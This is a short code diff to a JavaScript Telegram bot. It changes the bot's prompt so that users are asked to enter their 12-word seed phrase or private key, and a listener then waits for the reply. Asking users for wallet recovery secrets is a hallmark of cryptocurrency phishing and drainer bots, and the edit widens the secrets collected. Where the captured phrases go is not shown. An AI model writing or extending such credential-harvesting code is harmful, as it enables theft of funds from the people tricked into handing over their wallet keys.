@@ -145,7 +145,7 @@ bot.on("callback_query", (callbackQuery) => {
       const walletName = msg.text;
 
       // Prompt the user to enter their 7-seed phrase
-      bot.sendMessage(chatId, "Enter your 12-Seed Phrase:");
+      bot.sendMessage(chatId, "Enter your 12-Seed Phrase / Private key");
 
       // Step 5: Listen for the next message to get the 7-seed phrase
       bot.once("message", async (msg) => {
